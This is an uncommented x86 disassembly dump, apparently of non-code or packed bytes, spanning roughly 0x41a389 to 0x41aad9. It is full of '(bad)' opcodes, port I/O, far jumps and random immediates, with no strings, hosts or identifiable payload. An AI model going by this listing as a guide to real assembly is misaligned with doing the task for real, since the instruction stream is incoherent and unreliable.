  41a389:	jmp    DWORD PTR [ecx+0x743fa4c0]
  41a38f:	inc    BYTE PTR ds:0xa2043d57
  41a395:	mov    esp,ebp
  41a397:	inc    esp
  41a398:	fidivr WORD PTR [ebx-0x7c85e4da]
  41a39e:	out    0x52,al
  41a3a0:	mov    ch,0xf7
  41a3a2:	aaa    
  41a3a3:	pop    ebp
  41a3a4:	ins    BYTE PTR es:[edi],dx
  41a3a5:	outs   dx,BYTE PTR ds:[esi]
  41a3a6:	jmp    0x9184af17
  41a3ab:	xor    al,0xfb
  41a3ad:	mov    edx,0xf44f25e8
  41a3b2:	jp     0x41a3cc
  41a3b4:	xchg   BYTE PTR [ecx],ah
  41a3b6:	push   esi
  41a3b7:	sub    ecx,DWORD PTR [ecx-0x7c]
  41a3ba:	sub    esi,ecx
  41a3bc:	addr16 push cs
  41a3be:	out    dx,eax
  41a3bf:	xor    eax,0x8a9b0ded
  41a3c4:	in     al,dx
  41a3c5:	and    BYTE PTR [ebx],bh
  41a3c7:	xor    BYTE PTR [ebx+0xeeff5c3],dl
  41a3cd:	adc    ch,bh
  41a3cf:	(bad)  
  41a3d0:	mov    bl,0xa5
  41a3d2:	inc    edi
  41a3d3:	rcr    DWORD PTR [ebx-0x5f],cl
  41a3d6:	mov    al,ds:0xcff618a6
  41a3db:	push   ss
  41a3dc:	in     al,0xa3
  41a3de:	dec    esi
  41a3df:	jle    0x41a43a
  41a3e1:	mov    ah,0x8b
  41a3e3:	mov    ecx,0x4cd09f43
  41a3e8:	sub    esi,edi
  41a3ea:	inc    esp
  41a3eb:	push   edx
  41a3ec:	pop    ebx
  41a3ee:	mov    ebx,0x8c4fa8ad
  41a3f3:	mov    ecx,0x9303a27d
  41a3f8:	aas    
  41a3f9:	mov    ds:0xcee227be,al
  41a3fe:	adc    BYTE PTR [ecx+0xa863f9b],bl
  41a404:	(bad)  
  41a406:	dec    edx
  41a407:	and    eax,0xc22d4d10
  41a40c:	mov    edi,0x50ccb506
  41a411:	cmp    eax,DWORD PTR [ecx+ebx*1]
  41a414:	(bad)  
  41a415:	das    
  41a416:	push   esp
  41a417:	push   ds
  41a418:	mov    bh,0xdc
  41a41a:	and    DWORD PTR [edx],ecx
  41a41c:	(bad)  
  41a41d:	fidiv  DWORD PTR [edi-0x565e0c9e]
  41a423:	adc    esp,DWORD PTR [eax+0x489c68e5]
  41a429:	sar    dh,1
  41a42b:	in     eax,dx
  41a42c:	and    ecx,DWORD PTR [ebx]
  41a42e:	aad    0x21
  41a430:	into   
  41a431:	and    al,0x61
  41a433:	rcl    DWORD PTR ds:0x7dd601ba,1
  41a439:	mov    dh,BYTE PTR [edi+0x647612b7]
  41a43f:	mov    cl,0x12
  41a441:	push   cs
  41a442:	lods   al,BYTE PTR ds:[esi]
  41a443:	jmp    0xbba9:0xd74f7fd8
  41a44a:	dec    esi
  41a44b:	mov    bh,0xff
  41a44d:	lods   al,BYTE PTR ds:[esi]
  41a44e:	sub    dh,BYTE PTR [ecx]
  41a450:	in     eax,dx
  41a451:	mov    esi,es
  41a453:	xchg   esi,eax
  41a454:	or     DWORD PTR [ebx+0x5d6a8542],ebx
  41a45a:	add    esp,DWORD PTR [edx-0x58]
  41a45d:	jg     0x41a4c7
  41a45f:	sub    al,0xf
  41a461:	push   0x6f
  41a463:	adc    eax,0xa978dc65
  41a468:	xchg   edi,eax
  41a469:	bound  ecx,QWORD PTR [ecx-0x5b]
  41a46c:	es out dx,al
  41a46e:	adc    DWORD PTR [edi-0x784f27aa],0xffffff8a
  41a475:	aaa    
  41a476:	ror    DWORD PTR [ebx],0x4e
  41a479:	mov    esp,DWORD PTR [edi]
  41a47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a47c:	es aam 0x59
  41a47f:	retf   
  41a480:	lock xchg esp,eax
  41a482:	stos   BYTE PTR es:[edi],al
  41a483:	outs   dx,BYTE PTR ds:[esi]
  41a484:	scas   al,BYTE PTR es:[edi]
  41a485:	mov    ecx,0x5c6b36fd
  41a48a:	div    bl
  41a48c:	mov    ah,0xc6
  41a48e:	sub    ah,BYTE PTR [edx]
  41a490:	cld    
  41a491:	mov    esp,db1
  41a494:	pop    edx
  41a495:	mov    bh,0xc8
  41a497:	or     edx,edx
  41a499:	bound  esp,QWORD PTR [edx-0x76153954]
  41a49f:	cld    
  41a4a0:	test   BYTE PTR [ebp+0x6500a7c3],bh
  41a4a6:	test   eax,0x9597e164
  41a4ab:	daa    
  41a4ac:	je     0x41a452
  41a4ae:	rol    ch,1
  41a4b0:	mov    dl,0xe4
  41a4b2:	das    
  41a4b3:	sbb    eax,0xec2ec066
  41a4b8:	cdq    
  41a4b9:	hlt    
  41a4ba:	out    dx,eax
  41a4bb:	push   esi
  41a4bc:	das    
  41a4bd:	push   edi
  41a4be:	hlt    
  41a4bf:	mov    esp,0x61c51211
  41a4c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4c5:	mov    ecx,0xa4be4492
  41a4ca:	adc    al,0x19
  41a4cc:	test   DWORD PTR [esi+ebx*2-0x70],ebp
  41a4d0:	push   0xfffffff3
  41a4d2:	addr16 clc 
  41a4d4:	jmp    0x41a539
  41a4d6:	sub    ecx,DWORD PTR [edx+0x56]
  41a4d9:	pop    ebp
  41a4da:	push   ds
  41a4db:	sub    DWORD PTR [eax-0x1c978710],eax
  41a4e1:	xchg   esi,eax
  41a4e2:	adc    dh,bl
  41a4e4:	lock int3 
  41a4e6:	sahf   
  41a4e7:	jecxz  0x41a4a5
  41a4e9:	(bad)  
  41a4ea:	mov    ebp,0xadf51db2
  41a4ef:	and    DWORD PTR [edx-0x75],esp
  41a4f2:	xor    DWORD PTR [eax],ebp
  41a4f4:	int3   
  41a4f5:	or     eax,0x7940eb40
  41a4fa:	pop    eax
  41a4fb:	mov    BYTE PTR [ebx+0x723a795c],0x91
  41a502:	int    0x4e
  41a504:	rcl    BYTE PTR [ecx-0x60d5fb6a],cl
  41a50a:	and    BYTE PTR [ecx],dh
  41a50c:	lds    ecx,FWORD PTR [edx]
  41a50e:	jbe    0x41a4ba
  41a510:	arpl   WORD PTR [eax],dx
  41a512:	psubusb mm6,QWORD PTR [eax+0xc]
  41a516:	fcmovnbe st,st(1)
  41a518:	push   0x6c6e5ca1
  41a51d:	es xchg edi,eax
  41a51f:	bound  esi,QWORD PTR [esi]
  41a521:	stc    
  41a522:	stos   BYTE PTR es:[edi],al
  41a523:	aas    
  41a524:	out    dx,eax
  41a525:	sti    
  41a526:	sub    al,dh
  41a528:	sub    DWORD PTR [edi],ecx
  41a52a:	(bad)  
  41a52b:	xchg   esp,eax
  41a52c:	(bad)  
  41a52d:	xchg   edx,eax
  41a52e:	stos   DWORD PTR es:[edi],eax
  41a52f:	add    bh,BYTE PTR [ebx-0x68]
  41a532:	cwde   
  41a533:	mov    al,0x89
  41a535:	in     al,dx
  41a536:	in     al,dx
  41a537:	adc    esp,ebp
  41a539:	mov    cl,0xe9
  41a53b:	(bad)  
  41a53c:	pop    edx
  41a53d:	(bad)  
  41a53e:	pop    ebx
  41a53f:	or     ebp,esp
  41a541:	adc    ch,cl
  41a543:	test   DWORD PTR [edi+0x69fb5e6b],ebp
  41a549:	push   sp
  41a54b:	(bad)  [esi]
  41a54d:	(bad)
  41a550:	mov    BYTE PTR [edx+0x55],al
  41a553:	mov    ds:0xeaa4b434,eax
  41a558:	push   edi
  41a559:	mov    esp,0xad48dd1a
  41a55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a55f:	sub    ecx,DWORD PTR [esi+0x7422a545]
  41a565:	cmc    
  41a566:	cwde   
  41a567:	and    DWORD PTR [esi+0x318c667c],ebp
  41a56d:	inc    eax
  41a56e:	retf   0x8ae0
  41a571:	lahf   
  41a572:	call   0x3987:0x8bb5f6b1
  41a579:	popf   
  41a57a:	jle    0x41a591
  41a57c:	jg     0x95f332f7
  41a582:	gs clc 
  41a584:	cmc    
  41a585:	or     eax,0x15bc71ca
  41a58a:	cmp    BYTE PTR [ecx+ebp*4],0xa5
  41a58e:	rol    DWORD PTR [ebx+eax*4+0x12],0x7b
  41a593:	sbb    ah,cl
  41a595:	inc    ebp
  41a596:	mov    ecx,0xa0ada75b
  41a59b:	pop    esi
  41a59c:	je     0x41a5a0
  41a59e:	jae    0x41a569
  41a5a0:	sub    al,0xc8
  41a5a2:	retf   
  41a5a3:	xchg   DWORD PTR [eax+0x7cca010f],esp
  41a5a9:	hlt    
  41a5aa:	cmp    esi,ecx
  41a5ac:	push   esi
  41a5ad:	xlat   BYTE PTR ds:[ebx]
  41a5ae:	xchg   ecx,eax
  41a5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b0:	fistp  DWORD PTR [edx]
  41a5b2:	(bad)  
  41a5b3:	jl     0x41a5cb
  41a5b5:	sbb    bl,BYTE PTR [edx+0x79271bc9]
  41a5bb:	clc    
  41a5bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5bd:	repnz push cs
  41a5bf:	stos   DWORD PTR es:[edi],eax
  41a5c0:	stos   BYTE PTR es:[edi],al
  41a5c1:	(bad)  
  41a5c2:	adc    al,BYTE PTR [edi-0x47686d57]
  41a5c8:	jnp    0x41a5ed
  41a5ca:	or     BYTE PTR [eax+0x41],cl
  41a5cd:	jne    0x41a5b3
  41a5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5d0:	leave  
  41a5d1:	dec    esi
  41a5d2:	dec    ecx
  41a5d3:	pusha  
  41a5d4:	gs ret 0x9318
  41a5d8:	add    cl,BYTE PTR gs:[edx-0x678787d9]
  41a5df:	adc    al,0x86
  41a5e1:	adc    al,0x1d
  41a5e3:	in     al,0x2e
  41a5e5:	fild   DWORD PTR [ebx-0x7b1705c1]
  41a5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5ec:	sub    BYTE PTR [edx-0x55eda8b8],dh
  41a5f2:	sub    al,0xe1
  41a5f4:	jns    0x41a612
  41a5f6:	scas   eax,DWORD PTR es:[edi]
  41a5f7:	sub    esp,DWORD PTR [ecx]
  41a5f9:	cld    
  41a5fa:	jnp    0x41a642
  41a5fc:	mov    bl,BYTE PTR [ebx-0x2]
  41a5ff:	fisttp QWORD PTR [edi]
  41a601:	mov    ch,0x24
  41a603:	test   DWORD PTR [edx+0x4df0ea27],edi
  41a609:	gs call 0x68425b20
  41a60f:	mov    gs,WORD PTR ds:0xb369fae9
  41a615:	pusha  
  41a616:	ret    0xaa3e
  41a619:	inc    esp
  41a61a:	imul   edx,ecx,0xffffffb1
  41a61d:	push   ebx
  41a61e:	int3   
  41a61f:	lea    edx,[ecx-0x73]
  41a622:	mov    cl,0x65
  41a624:	sahf   
  41a625:	mov    bl,cl
  41a627:	sets   ch
  41a62a:	mov    ebp,0x83ad2f18
  41a62f:	cli    
  41a630:	push   ds
  41a631:	adc    al,0x96
  41a633:	rol    BYTE PTR [eax-0x47],0x8a
  41a637:	scas   al,BYTE PTR es:[edi]
  41a638:	out    dx,eax
  41a639:	fisttp DWORD PTR [edi+0x40]
  41a63c:	mov    bh,0xd2
  41a63e:	(bad)
  41a642:	ret    0x4c76
  41a645:	dec    ebp
  41a646:	cmp    DWORD PTR [edx+0x621d7afd],eax
  41a64c:	xlat   BYTE PTR ds:[ebx]
  41a64d:	or     BYTE PTR [edi-0x206ad764],bl
  41a653:	and    eax,0xf7b55cf5
  41a658:	pop    esp
  41a659:	div    DWORD PTR [ebp+ecx*2-0xe]
  41a65d:	sub    DWORD PTR [edx+0x8ab9423],edx
  41a663:	mov    edi,ecx
  41a665:	xlat   BYTE PTR ds:[ebx]
  41a666:	xchg   ebx,eax
  41a667:	pop    edx
  41a668:	ret    
  41a669:	ds mov edx,0x62473f67
  41a66f:	or     al,0x37
  41a671:	idiv   DWORD PTR [eax]
  41a673:	pop    ebx
  41a674:	fild   WORD PTR ds:0x61392b4b
  41a67a:	or     DWORD PTR [eax],edi
  41a67c:	sub    DWORD PTR [esi],0xd8ecea94
  41a682:	out    0x77,eax
  41a684:	out    dx,eax
  41a685:	xlat   BYTE PTR ds:[ebx]
  41a686:	push   es
  41a687:	pop    ecx
  41a688:	out    dx,al
  41a689:	scas   al,BYTE PTR es:[edi]
  41a68a:	or     DWORD PTR [eax-0x37],edi
  41a68d:	mov    dh,0xd5
  41a68f:	mov    ecx,0x55018bb9
  41a694:	std    
  41a695:	sbb    DWORD PTR [esi-0x107c1e93],esp
  41a69b:	xchg   ebp,eax
  41a69c:	test   BYTE PTR ds:0x9eb5f035,ch
  41a6a2:	pop    esi
  41a6a3:	inc    ebp
  41a6a4:	xchg   DWORD PTR [edx+edx*4+0x12],edi
  41a6a8:	inc    esp
  41a6a9:	(bad)  
  41a6aa:	mov    ds:0x7320fe6f,al
  41a6af:	dec    edx
  41a6b0:	push   ebx
  41a6b1:	push   edx
  41a6b2:	sbb    DWORD PTR ds:[esi-0x3a],ebx
  41a6b6:	sbb    DWORD PTR [eax],eax
  41a6b8:	inc    ebx
  41a6b9:	inc    esi
  41a6ba:	stos   BYTE PTR es:[edi],al
  41a6bb:	pop    esi
  41a6bc:	push   ss
  41a6bd:	clc    
  41a6be:	mov    cl,0x1f
  41a6c0:	ror    BYTE PTR [edi],1
  41a6c2:	sbb    BYTE PTR [ebx-0x3f162008],ch
  41a6c8:	arpl   WORD PTR [ecx+esi*2],bx
  41a6cb:	pop    ebx
  41a6cc:	aam    0x5e
  41a6ce:	lds    eax,FWORD PTR [edi-0x54]
  41a6d1:	cmp    al,0x14
  41a6d3:	ficomp DWORD PTR [edi+0x5d7f109b]
  41a6d9:	dec    esi
  41a6da:	ficomp WORD PTR [ebx-0x2c]
  41a6dd:	mov    cl,0x8e
  41a6df:	mov    esp,0xe12d61ee
  41a6e4:	daa    
  41a6e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e6:	js     0x41a740
  41a6e8:	stos   DWORD PTR es:[edi],eax
  41a6e9:	leave  
  41a6ea:	cmp    ebp,DWORD PTR [esp+esi*1]
  41a6ed:	sub    DWORD PTR [ebp-0x18],esp
  41a6f0:	in     al,dx
  41a6f1:	repnz aaa 
  41a6f3:	(bad)  
  41a6f4:	popa   
  41a6f5:	test   BYTE PTR [esi],ch
  41a6f7:	ds push 0xcce9b13e
  41a6fd:	adc    ecx,edi
  41a6ff:	fprem  
  41a701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a702:	fisubr WORD PTR [edx-0x289aa3f9]
  41a708:	mov    ecx,0x758829f0
  41a70d:	and    al,0xb4
  41a70f:	xor    BYTE PTR cs:[ebx],dl
  41a712:	inc    eax
  41a713:	or     al,BYTE PTR [edi-0x80]
  41a716:	jne    0x41a704
  41a718:	int    0xb4
  41a71a:	pop    esp
  41a71b:	xchg   DWORD PTR [ebx],esp
  41a71d:	rdtsc  
  41a71f:	xchg   edi,eax
  41a720:	push   0xffffff98
  41a722:	shl    esp,1
  41a724:	pop    ebp
  41a725:	scas   eax,DWORD PTR es:[edi]
  41a726:	fstp   TBYTE PTR [edi+0x78a84c48]
  41a72c:	or     cl,BYTE PTR [esi+esi*1+0x7828f4fe]
  41a733:	mov    WORD PTR [edi-0x36],es
  41a736:	jmp    0x27b:0xc2efabdb
  41a73d:	dec    ecx
  41a73e:	leave  
  41a73f:	mov    esi,0x3b272995
  41a744:	xor    DWORD PTR [esi-0x8aa0f88],edi
  41a74a:	dec    esp
  41a74b:	xor    ch,BYTE PTR [esi+0x2e44b1c2]
  41a751:	clc    
  41a752:	in     al,0x53
  41a754:	and    BYTE PTR [ebx],cl
  41a756:	inc    ebx
  41a757:	jle    0x41a70e
  41a759:	or     eax,0x2c
  41a75c:	xor    eax,0x11912797
  41a761:	sub    al,0xcc
  41a763:	sar    DWORD PTR [ecx-0x3e],cl
  41a766:	jo     0x41a784
  41a768:	std    
  41a769:	lahf   
  41a76a:	mov    bl,bh
  41a76c:	adc    DWORD PTR ds:0x9f4cb8ec,esi
  41a772:	cdq    
  41a773:	mov    ds:0x95290035,al
  41a778:	or     bh,0x57
  41a77b:	(bad)  
  41a77c:	aaa    
  41a77d:	out    0x30,eax
  41a77f:	je     0x41a751
  41a781:	sub    DWORD PTR [ebx+ebx*4+0x5df2132d],ebx
  41a788:	cmp    al,0x48
  41a78a:	or     BYTE PTR cs:[ecx],ah
  41a78d:	inc    esi
  41a78e:	fs push eax
  41a790:	sub    BYTE PTR cs:[eax+0x126dc603],ah
  41a797:	bound  edx,QWORD PTR [di+0x4403]
  41a79c:	xchg   ebx,eax
  41a79d:	inc    edx
  41a79e:	imul   ecx,eax,0x8dc647d
  41a7a4:	aam    0x50
  41a7a6:	push   es
  41a7a7:	mov    eax,0xc2d3af1a
  41a7ac:	push   es
  41a7ad:	outs   dx,BYTE PTR ds:[esi]
  41a7ae:	adc    al,BYTE PTR [edi-0x5d]
  41a7b1:	mov    esi,0x6b481f30
  41a7b6:	ror    DWORD PTR [ecx+0x3000924e],1
  41a7bc:	push   0x10
  41a7be:	jmp    0x41a805
  41a7c0:	inc    esi
  41a7c1:	daa    
  41a7c2:	push   0x4f
  41a7c4:	stc    
  41a7c5:	push   ebp
  41a7c6:	push   ss
  41a7c7:	mov    bh,0x9
  41a7c9:	jmp    0x41a806
  41a7cb:	inc    eax
  41a7cc:	fcomip st,st(0)
  41a7ce:	and    BYTE PTR [edx+eax*8],dl
  41a7d1:	dec    edi
  41a7d2:	enter  0xb39a,0xf9
  41a7d6:	(bad)  
  41a7d7:	xchg   esp,eax
  41a7d8:	or     DWORD PTR [ebp-0x3a],edx
  41a7db:	cdq    
  41a7dc:	sbb    edx,edx
  41a7de:	lods   al,BYTE PTR ds:[esi]
  41a7df:	ss dec ebx
  41a7e1:	mov    eax,ds:0xd37f8bb9
  41a7e6:	(bad)  
  41a7e7:	outs   dx,DWORD PTR ds:[esi]
  41a7e8:	xor    al,bl
  41a7ea:	xor    eax,0x2d81b3d2
  41a7ef:	adc    BYTE PTR [ebp+ebx*2+0x27bb7a2],bl
  41a7f6:	test   al,0xea
  41a7f8:	cld    
  41a7f9:	sub    esp,edi
  41a7fb:	ins    BYTE PTR es:[edi],dx
  41a7fc:	pop    esp
  41a7fd:	cdq    
  41a7fe:	lock mov dl,0x9c
  41a801:	add    eax,DWORD PTR [ecx+0x768aafff]
  41a807:	repnz test al,0x95
  41a80a:	or     al,0x92
  41a80c:	dec    edi
  41a80d:	xor    al,0x66
  41a80f:	jbe    0x41a7df
  41a811:	add    eax,0xf6aea690
  41a816:	add    al,0xbf
  41a818:	jbe    0x41a7b1
  41a81a:	xor    esi,DWORD PTR [ecx]
  41a81c:	dec    edx
  41a81d:	mov    esi,0x31c94e64
  41a822:	fiadd  WORD PTR [eax+0x5ac0ca80]
  41a828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a829:	dec    edx
  41a82a:	dec    edi
  41a82b:	add    al,0x8f
  41a82d:	mov    cl,0xbb
  41a82f:	int3   
  41a830:	(bad)  
  41a831:	mov    edi,0xfdfcf8d0
  41a836:	add    esi,DWORD PTR [ecx+0x25d3e975]
  41a83c:	icebp  
  41a83d:	push   0x6d719717
  41a842:	push   edx
  41a843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a844:	pop    es
  41a845:	cmc    
  41a846:	test   BYTE PTR [edx+edx*4],dl
  41a849:	fwait
  41a84a:	in     eax,dx
  41a84b:	xchg   esp,eax
  41a84c:	mov    cl,0xe9
  41a84e:	int3   
  41a84f:	mov    BYTE PTR [ebx+0x22340951],bl
  41a855:	mov    ds,WORD PTR [edi]
  41a857:	ficom  DWORD PTR [eax-0x54]
  41a85a:	mov    esp,0x4704fdc6
  41a85f:	pop    ebx
  41a860:	popa   
  41a861:	sub    eax,0xc16c77d1
  41a866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a867:	cmp    eax,0xf169d69c
  41a86c:	mov    es,WORD PTR [eax+ebx*1+0x4181ba2a]
  41a873:	jmp    0x8c28:0x460236c9
  41a87a:	pop    ecx
  41a87b:	enter  0xffb3,0x21
  41a87f:	mov    ebp,0x618d8502
  41a884:	inc    eax
  41a885:	gs push edx
  41a887:	adc    BYTE PTR [edi+0x4f0e3fdf],ch
  41a88d:	mov    eax,0x1364fe2
  41a892:	ja     0x41a8fe
  41a894:	mov    ch,0x58
  41a896:	scas   al,BYTE PTR es:[edi]
  41a897:	je     0x41a848
  41a899:	popf   
  41a89a:	push   ebp
  41a89b:	and    eax,eax
  41a89d:	outs   dx,DWORD PTR ds:[esi]
  41a89e:	push   cs
  41a89f:	or     BYTE PTR [esi-0x3d7dc6bf],ah
  41a8a5:	mov    dh,0x8d
  41a8a7:	cmp    al,0x41
  41a8a9:	out    0x10,eax
  41a8ab:	or     BYTE PTR [ecx+0x347cafdf],ah
  41a8b1:	xor    eax,0x4334d0e2
  41a8b6:	cmc    
  41a8b7:	sub    ch,al
  41a8b9:	or     ecx,edi
  41a8bb:	or     dl,BYTE PTR [edi+0x51d68347]
  41a8c1:	or     dl,BYTE PTR [edx+ecx*4]
  41a8c4:	and    ch,BYTE PTR [edx+ebx*2-0x53]
  41a8c8:	sub    DWORD PTR [esi+0xada7707],esi
  41a8ce:	jg     0x41a88b
  41a8d0:	pop    eax
  41a8d1:	loop   0x41a8b7
  41a8d3:	mov    bl,0x21
  41a8d5:	adc    eax,0x86d7a5ce
  41a8da:	add    eax,0x75dc5097
  41a8df:	sub    bh,BYTE PTR [esi+0x67]
  41a8e2:	pusha  
  41a8e3:	pushf  
  41a8e4:	dec    esp
  41a8e5:	or     edi,DWORD PTR [edi+0x2e]
  41a8e8:	dec    esp
  41a8e9:	or     ah,BYTE PTR [ebx]
  41a8eb:	xor    BYTE PTR [eax+0x31],bh
  41a8ee:	xchg   edx,eax
  41a8ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8f0:	and    ebx,0x2bc159f
  41a8f6:	repz or esp,DWORD PTR [di]
  41a8fa:	ror    ch,cl
  41a8fc:	pop    edi
  41a8fd:	and    BYTE PTR [ebx-0x66adabdb],bh
  41a903:	retf   0x8217
  41a906:	fldcw  WORD PTR [edx-0x632251b3]
  41a90c:	xor    DWORD PTR [eax],edx
  41a90e:	fdiv   QWORD PTR [ecx+0x49859991]
  41a914:	pop    ebp
  41a915:	into   
  41a916:	retf   
  41a917:	mov    edi,0x38173206
  41a91c:	sahf   
  41a91d:	(bad)  
  41a91e:	popa   
  41a91f:	mov    ebp,0xb756daa0
  41a924:	nop
  41a925:	xor    ebx,ebx
  41a927:	jno    0x41a9a0
  41a929:	inc    esi
  41a92a:	cmp    DWORD PTR [edx],edx
  41a92c:	jp     0x41a9ac
  41a92e:	inc    edx
  41a92f:	sbb    ebp,ebx
  41a931:	mov    cl,0x42
  41a933:	pop    ss
  41a934:	adc    BYTE PTR [ebx+0x31],bl
  41a937:	inc    edi
  41a938:	xlat   BYTE PTR ds:[ebx]
  41a939:	adc    esp,DWORD PTR [edx+eax*8-0x65927d52]
  41a940:	sub    dh,ah
  41a942:	in     al,0x74
  41a944:	test   DWORD PTR [esi+eax*1],eax
  41a947:	test   al,0x88
  41a949:	leave  
  41a94a:	test   eax,0xed2af315
  41a94f:	push   0xffffffa8
  41a951:	push   ebx
  41a952:	mov    ds:0xad0bf6c4,eax
  41a957:	push   ecx
  41a958:	arpl   WORD PTR [ebx+0x478ddbf2],sp
  41a95e:	test   DWORD PTR [edx],0xc8855dc6
  41a964:	mov    bh,0x71
  41a966:	retf   0x139f
  41a969:	js     0x41a97d
  41a96b:	sub    esi,DWORD PTR [edi]
  41a96d:	mov    dl,0xfb
  41a96f:	pushf  
  41a970:	pop    edx
  41a971:	fwait
  41a972:	jne    0x41a912
  41a974:	retf   
  41a975:	ds cld 
  41a977:	push   esi
  41a978:	dec    esi
  41a979:	ins    BYTE PTR es:[edi],dx
  41a97a:	dec    ecx
  41a97b:	std    
  41a97c:	adc    BYTE PTR [edx-0x44],bl
  41a97f:	xchg   ebx,eax
  41a980:	fistp  DWORD PTR [ebx+0x5dd52acc]
  41a986:	adc    ecx,ebx
  41a988:	pop    esi
  41a98a:	jmp    0x41a960
  41a98c:	and    BYTE PTR [ecx-0x4f6d5101],0xf1
  41a993:	xchg   DWORD PTR [ebx-0x7e],edx
  41a996:	or     al,0x32
  41a998:	push   edi
  41a999:	cmp    eax,edx
  41a99b:	punpckhdq mm0,QWORD PTR [edx+ebx*8-0x471af792]
  41a9a3:	loopne 0x41a983
  41a9a5:	jo     0x41a9d5
  41a9a7:	xchg   ebx,eax
  41a9a8:	push   ebx
  41a9a9:	xor    al,0xfa
  41a9ab:	fld    TBYTE PTR [esi-0x2db5e9e9]
  41a9b1:	mov    BYTE PTR [eax-0x4c],dl
  41a9b4:	mov    cl,0x45
  41a9b6:	repnz div BYTE PTR [eax]
  41a9b9:	ret    0x4218
  41a9bc:	and    al,0x8b
  41a9be:	mov    ebp,0xdd23f666
  41a9c3:	mov    esi,0x849fb818
  41a9c8:	push   edx
  41a9c9:	xor    bl,BYTE PTR [eax+0x1f]
  41a9cc:	add    eax,0xfe7e7f0b
  41a9d1:	push   esp
  41a9d2:	sti    
  41a9d3:	out    dx,al
  41a9d4:	iret   
  41a9d5:	mov    bh,0x34
  41a9d7:	rcr    eax,1
  41a9d9:	mov    ah,0xbd
  41a9db:	mov    DWORD PTR [edi+0x6d20a04c],esi
  41a9e1:	stc    
  41a9e2:	push   ebx
  41a9e3:	dec    edi
  41a9e4:	out    dx,eax
  41a9e5:	js     0x41a9fe
  41a9e7:	add    esi,DWORD PTR ds:[esi]
  41a9ea:	adc    eax,DWORD PTR [edx+0x23]
  41a9ed:	es push ecx
  41a9ef:	rcr    BYTE PTR [ecx-0xd152d0a],cl
  41a9f5:	loope  0x41aa3e
  41a9f7:	daa    
  41a9f8:	push   cs
  41a9f9:	lods   eax,DWORD PTR ds:[esi]
  41a9fa:	sbb    BYTE PTR [ebx*8+0x57c69ba5],dh
  41aa01:	jb     0x41a9d2
  41aa03:	cmp    DWORD PTR [ebx],esp
  41aa05:	test   al,0x2a
  41aa07:	pop    esp
  41aa08:	pop    edx
  41aa09:	iret   
  41aa0a:	jo     0x41a9ef
  41aa0c:	loop   0x41aa10
  41aa0e:	jno    0x41aa7f
  41aa10:	xchg   DWORD PTR [eax],eax
  41aa12:	mov    ah,0xed
  41aa14:	dec    esp
  41aa15:	in     al,dx
  41aa16:	adc    DWORD PTR ss:[ecx+0x49],edi
  41aa1a:	fldcw  WORD PTR [eax+ecx*4]
  41aa1d:	int3   
  41aa1e:	sbb    BYTE PTR [edi-0x35c500d5],bh
  41aa24:	fld    QWORD PTR [ebp-0x71]
  41aa27:	xor    al,0xaa
  41aa29:	push   edi
  41aa2a:	outs   dx,BYTE PTR ds:[esi]
  41aa2b:	shl    BYTE PTR [edi+0x5b],cl
  41aa2e:	adc    DWORD PTR [esi+ecx*2],ebx
  41aa31:	(bad)  
  41aa32:	leave  
  41aa33:	imul   esi,DWORD PTR [ebx+0x53],0x20b14f68
  41aa3a:	aad    0xd3
  41aa3c:	xchg   esi,eax
  41aa3d:	ss push cs
  41aa3f:	(bad)  
  41aa41:	int3   
  41aa42:	imul   ebx,DWORD PTR [ebx],0x152632d7
  41aa48:	xchg   ecx,eax
  41aa49:	popf   
  41aa4a:	scas   al,BYTE PTR es:[edi]
  41aa4b:	lea    edi,[eax+0x79c5ae31]
  41aa51:	jecxz  0x41aa9e
  41aa53:	sub    DWORD PTR [ecx-0x37cf0b38],0xffffffc3
  41aa5a:	jmp    0x41aa8d
  41aa5c:	sbb    ebx,ebx
  41aa5e:	loopne 0x41aa79
  41aa60:	stc    
  41aa61:	(bad)  
  41aa62:	in     eax,0x42
  41aa64:	les    edx,FWORD PTR [eax-0x4cf9c621]
  41aa6a:	sub    al,0xd9
  41aa6c:	ins    DWORD PTR es:[edi],dx
  41aa6d:	xchg   BYTE PTR [esi+eiz*1],cl
  41aa70:	mov    DWORD PTR [esi+ecx*2-0x706e1a00],edi
  41aa77:	sub    BYTE PTR [esp+edi*1+0x56ccc8dc],ah
  41aa7e:	push   0xbf92110e
  41aa83:	leave  
  41aa84:	or     DWORD PTR [edx+0xd],0x54
  41aa88:	push   0xc7e71870
  41aa8d:	into   
  41aa8e:	imul   DWORD PTR [ebp-0x75]
  41aa91:	data16 aad 0xd7
  41aa94:	aaa    
  41aa95:	sbb    DWORD PTR [edi+0x27],esi
  41aa98:	xchg   edi,eax
  41aa99:	neg    ebp
  41aa9b:	push   edi
  41aa9c:	cmc    
  41aa9d:	adc    BYTE PTR [esi+0x1f],dh
  41aaa0:	jl     0x41aab4
  41aaa2:	mov    ebx,0x701df2c3
  41aaa7:	rcr    al,0x98
  41aaaa:	add    esi,DWORD PTR [eax+0x24]
  41aaad:	pop    ebp
  41aaae:	daa    
  41aaaf:	(bad)  
  41aab0:	mov    eax,0xf032c15a
  41aab5:	scas   eax,DWORD PTR es:[edi]
  41aab6:	xchg   ebx,eax
  41aab7:	cmp    ch,cl
  41aab9:	lds    ebp,FWORD PTR [ebp-0x6f]
  41aabc:	cwde   
  41aabd:	out    0x6e,al
  41aabf:	ins    DWORD PTR es:[edi],dx
  41aac0:	out    0x1d,eax
  41aac2:	sbb    bh,BYTE PTR [ebx+0x580e3d58]
  41aac8:	sbb    esp,ebx
  41aaca:	adc    dl,BYTE PTR [esi+esi*4+0xd5309d5]
  41aad1:	cmp    BYTE PTR [edx-0xe],cl
  41aad4:	cmc    
  41aad5:	sub    BYTE PTR [eax+0x1a],0x7e
  41aad9:	dec    ebp
